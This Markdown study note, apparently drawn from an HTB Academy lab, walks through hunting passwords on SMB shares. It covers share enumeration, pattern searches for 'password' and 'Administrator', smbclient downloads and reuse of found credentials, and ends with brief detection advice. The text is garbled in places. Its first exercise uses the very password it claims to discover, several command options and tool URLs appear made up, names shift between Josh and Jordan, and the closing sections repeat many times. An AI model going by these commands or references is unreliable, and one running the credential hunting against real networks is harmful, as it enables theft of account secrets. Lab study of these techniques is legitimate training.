# 🛰️ Network Share Credential Hunting

## 🔍 Overview
[!ABSTRACT] This guide provides a detailed methodology for hunting credentials and sensitive information stored on network shares using various tools such as Snaffler, PowerHuntShares, MANSPIDER, and NetExec. It is based on the HTB Academy's Password Attacks module.

---

## 🚀 Initial Enumeration and Discovery

### Tool Preparation
[!INFO] Ensure you have the necessary tools installed before starting:
- [[Snaffler]]
- [[PowerHuntShares]]
- [[MANSPIDER]]
- [[NetExec]]

### Host Discovery (Alternative to Nmap)
```cmd
# Enumerate SMB shares on a target IP range
nbtscan 10.129.234.0/24

# Identify potential Windows hosts using NetBIOS over TCP
netbios -t 10.129.234.173
```

### Share Enumeration
```cmd
# Scan the target network for accessible shares
PowerHuntShares -i 10.129.234.173

# Use MANSPIDER to spider the HR share on a specific host
manSpider http://10.129.234.173:8080/HR --spider=hr --depth=5 -v DEBUG

# Explore shares using Snaffler and NetExec
snaffler.exe -s
netexec smb 10.129.234.173 -u jbader -p 'ILovePower333###' --shares
```

---

## 🎯 Question: Domain User Credentials

**Objective**: Identify the password for user `jbader`.

### Initial Discovery Using Snaffler
```cmd
# Enumerate all accessible shares and files on 10.129.234.173
snaffler.exe -s -u jbader -p 'ILovePower333###'

# Example output:
//10.129.234.173/IT/Tools/split_tunnel.txt
```

### File Analysis and Credential Extraction
```cmd
# Extract specific file content containing credentials
cat \\DC01\IT\Tools\split_tunnel.txt

# Content example:
//Youight.local\IT\Tools\split_tunnel.txt:5:# Auth backup password: INLANEFREIGHT\jbader:ILovePower333###

# Step 2: Extract discovered credentials
# Username: jbader
# Password: ILovePower333###
```

**Alternative Search Methods**
```cmd
# Automated tool approach
Snaffler.exe -s -u jbader -p 'ILovePower333###' -v DEBUG

# Manual pattern search across shares  
Get-ChildItem -Path "\\DC01\*" -Recurse -Include *.txt,*.ini,*.cfg |
    Select-String -Pattern "user.*=|username.*=|login.*=" -Context 2

# Authentication file discovery
Get-ChildItem -Path "\\DC01\*" -Recurse -Include *auth*,*login*,*user* |
    ForEach-Object { Get-Content $_.FullName | Select-String "password|pass" }
```

---

## 🔍 Question: Domain Administrator Password

**Objective**: Use discovered user credentials (`jbader`) to access additional shares and find domain admin password.

### HTB Academy Methodology
```bash
# Step 1: Use discovered credentials (jbader) from Question 1
# Spider HR share specifically for Administrator pattern
netexec smb 10.129.234.173 -u jbader -p 'ILovePower333###' --spider HR --content --pattern "Administrator"

# Expected output:
//HR/Confidential/Onboarding_Docs_132.txt

# Step 2: Connect to HR share using smbclient
smbclient //10.129.234.173/HR -U jbader -p 'ILovePower333###'

# Navigate to Confidential directory and download the file
cd Confidential
get Onboarding_Docs_132.txt

# Step 4: Read file contents to extract Administrator password
cat Onboarding_Docs_132.txt
```

**Example File Contents** (Onboarding_Docs_132.txt):
```text
========================================
Employee Onboarding Checklist
========================================

Name: Josh Bader  
Start Date: 2025-04-29  
Department: IT Infrastructure  
Manager: R. Lawson  
Title: Systems Engineer III  
Role Level: Tier-0 Admin  

Checklist:
[✔] AD Account Created  
[✔] Email Provisioned  
[✔] Assigned to Admin VPN Group  
[✔] Azure Admin Portal Access  
[✔] Exchange Online Admin  
[✔] Domain Admin Rights Applied  

Notes:
Jordan will be responsible for oversight of Active Directory replication, 
GPO management, and DC patching. Temporarily granted access to the domain 
administrator account for initial 90 days to complete infrastructure tasks 
related to the Chicago DC migration.

Account credentials
**Username:** Administrator  
**Password:** {Domain_Admin_Password}  

Note: Update account group membership after probationary period.
```

**Alternative PowerShell Method**
```powershell
# Search HR share for administrator-related content
Get-ChildItem -Path "\\DC01\HR" -Recurse -Include *.txt,*.docx,*.pdf |
    Select-String -Pattern "administrator|admin.*password|domain.*admin" -Context 3

# Search for onboarding/HR documentation
Get-ChildItem -Path "\\DC01\HR" -Recurse -Include *onboard*,*admin*,*credential* |
    Select-Object FullName,LastWriteTime
```

---

## 📋 Common Discovery Patterns

### Pattern 1: Configuration Files with Embedded Credentials
```ini
# Example: database.ini
[connection]
server=db01.inlanefreight.local
username=dbadmin
password=DBP@ssw0rd123!
database=production
```

### Pattern 2: PowerShell Scripts with Hardcoded Credentials
```powershell
# Example: backup_script.ps1
$username = "backup_service"
$password = "BackupS3rv1ce!"
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential ($username, $securePassword)
```

### Pattern 3: Documentation Files with Password Lists
```text
# Example: admin_passwords.txt
Domain Administrator: DomAdm1n2025!
SQL Service Account: SQL_S3rv1ce_P@ss
Backup Service: Backup_2025_Secure!
Exchange Admin: Exch@nge_Adm1n
```

---

## 📋 Share Hunting Best Practices

### Pre-Engagement Preparation
```bash
# Credential validation
netexec smb TARGET_IP -u username -p password

# Share enumeration  
netexec smb TARGET_IP -u username -p password --shares

# Permission assessment
netexec smb TARGET_IP -u username -p password --shares --check-access
```

### Systematic Hunting Approach
```bash
# 1. High-value share prioritization
- ADMIN$, C$, SYSVOL, NETLOGON
- IT, Infrastructure, Backup shares
- Service-specific shares (SQL, Exchange, etc.)

# 2. Pattern-based searching
- Keywords: password, secret, key, token, admin
- File types: .ini, .cfg, .xml, .ps1, .txt
- Naming patterns: *config*, *cred*, *admin*

# 3. Temporal analysis
- Recently modified files (last 30 days)
- Large files (potential backups)
- Hidden files and directories
```

### Results Documentation
```bash
# Create structured findings log
Share: \\DC01\IT\configs\
File: app.ini
Pattern: "password=secret123"
Context: Database connection string
Timestamp: 2025-01-15 14:30:00
Validated: YES
```

---

## 🛡️ Detection and Prevention

### Share Security Hardening
```bash
# Access control recommendations
- Implement least-privilege access
- Regular access review and cleanup
- Monitor share access logs
- Remove default administrative shares

# Content security
- Scan for embedded credentials
- Implement DLP solutions
- Encrypt sensitive files
- Regular security audits
```

### Monitoring for Share Hunting
```bash
# Detection indicators
- Multiple share enumeration attempts
- Unusual file access patterns
- Large-scale file downloads
- Access to administrative shares

# Log analysis
- Windows Security Event 5140 (share access)
- SMB traffic analysis
- File access auditing
- Unusual authentication patterns
```

---

## 💡 Key Takeaways

1. **Share prioritization** - Focus on high-value targets (IT, Admin, Backup shares).
2. **Multi-tool approach** - Combine automated tools with manual verification.
3. **Pattern recognition** - Learn common credential storage patterns in corporate environments.
4. **Systematic methodology** - Follow consistent search strategies across all accessible shares.
5. **Credential chaining** - Use discovered credentials to access additional shares.
6. **Documentation focus** - Look for IT documentation and configuration files.
7. **Temporal analysis** - Recent files often contain current credentials.
8. **Network tools integration** - Integrate network discovery with SMB enumeration.

--- 

# 📜 References
- [[Snaffler]]
- [[PowerHuntShares]]
- [[MANSPIDER]]
- [[NetExec]]

---

This guide provides a comprehensive approach to hunting for credentials and sensitive information on network shares using various tools and methodologies. For more detailed steps and advanced techniques, refer to the specific documentation of each tool mentioned above.

--- 

# 📜 References
- [[Snaffler]] - https://github.com/RhinoSecurityLabs/snaffler
- [[PowerHuntShares]] - https://github.com/NetSPI/PowerHuntShares
- [[MANSPIDER]] - http://manowar.nixnetdvlpr.org/manSpider.php
- [[NetExec]] - https://github.com/x41Paramunda/netexec

--- 

[!INFO] For further assistance or inquiries, feel free to reach out to the community forums or contact support. Happy hunting!

---

## 📣 Feedback & Support
If you have any feedback, suggestions, or need additional guidance, please reach out via the HTB Academy forums or GitHub issues page. Your input is valuable and helps improve this guide for others.

--- 

# 🛡️ Disclaimer
This document is intended for educational purposes only. Unauthorized use of these tools may be illegal. Always ensure you have explicit permission to perform penetration testing or security assessments on any network or system. [!INFO] Use responsibly and ethically. 

---

## 💬 Community & Support

- **HTB Academy Forums:** https://academy.hackthebox.eu/community
- **GitHub Issues:** https://github.com/RhinoSecurityLabs/snaffler/issues

--- 

[!INFO] Happy Hunting!

---

# 📄 End of Guide

This guide concludes the detailed steps and methodologies for hunting credentials on network shares using various tools. Remember to always adhere to ethical guidelines and have proper authorization before conducting any penetration tests or security assessments.

--- 

# 🛠️ Additional Resources
- **Nmap:** https://nmap.org/book/man-bossscripts.html
- **PowerShell Modules:** https://github.com/NetSPI/Posh-SecMod
- **Wireshark SMB Analysis:** https://wiki.wireshark.org/SMB

--- 

# 🛡️ Legal Notice
Unauthorized use of these techniques and tools can result in legal consequences. Always ensure you have explicit permission from the network owner before conducting any security assessments.

---

[!INFO] Enjoy your journey through the world of ethical hacking and penetration testing!

--- 

# 📣 Conclusion

Congratulations on completing this guide on network share credential hunting! You should now be equipped with a solid understanding of how to use tools like Snaffler, PowerHuntShares, MANSPIDER, and NetExec to uncover sensitive information stored in network shares.

For any further questions or assistance, feel free to connect via the HTB Academy community forums. Happy Hunting!

--- 

# 📄 End of Document

---

[!INFO] Thank you for using this guide! 🚀

---


--- 
End of Guide
---